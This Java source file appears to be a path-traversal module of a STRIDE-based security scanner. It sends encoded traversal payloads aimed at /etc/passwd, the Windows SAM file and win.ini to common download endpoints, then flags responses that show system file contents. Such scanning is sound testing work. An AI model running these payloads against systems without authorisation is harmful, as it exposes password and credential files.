package attacks;

import config.AttackConfig;
import model.AttackResult;
import model.StrideCategory;
import util.HttpUtil;

public class PathTraversalAttack {

    public static AttackResult run(AttackConfig config) {

        String[] traversalPayloads = {
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "....\\\\....\\\\....\\\\windows\\\\win.ini"
        };

        String[] endpointTemplates = {
            "/api/files?path=",
            "/download?file=",
            "/api/download?filename=",
            "/file?name="
        };

        for (String endpoint : endpointTemplates) {
            for (String payload : traversalPayloads) {
                String url = config.targetUrl + endpoint + payload;
                String response = HttpUtil.get(url);

                if (response.contains("root:") || response.contains("[boot loader]") ||
                    response.contains("windows") || response.contains("fonts") ||
                    response.contains("/bin/bash") || response.contains("daemon:")) {

                    String details = String.format(
                        "Path traversal vulnerability detected at '%s' with payload '%s'. System files accessible",
                        endpoint, truncate(payload, 30));

                    return new AttackResult("Path Traversal", true, details,
                        StrideCategory.INFORMATION_DISCLOSURE, "PathTraversalAttack",
                        "multiple file endpoints");
                }
            }
        }

        return new AttackResult("Path Traversal", false,
            "No path traversal vulnerability detected. Tested "
            + (traversalPayloads.length * endpointTemplates.length)
            + " combinations across common endpoints",
            StrideCategory.INFORMATION_DISCLOSURE, "PathTraversalAttack",
            "multiple file endpoints");
    }

    private static String truncate(String str, int maxLength) {
        return str.length() <= maxLength ? str : str.substring(0, maxLength) + "...";
    }
}
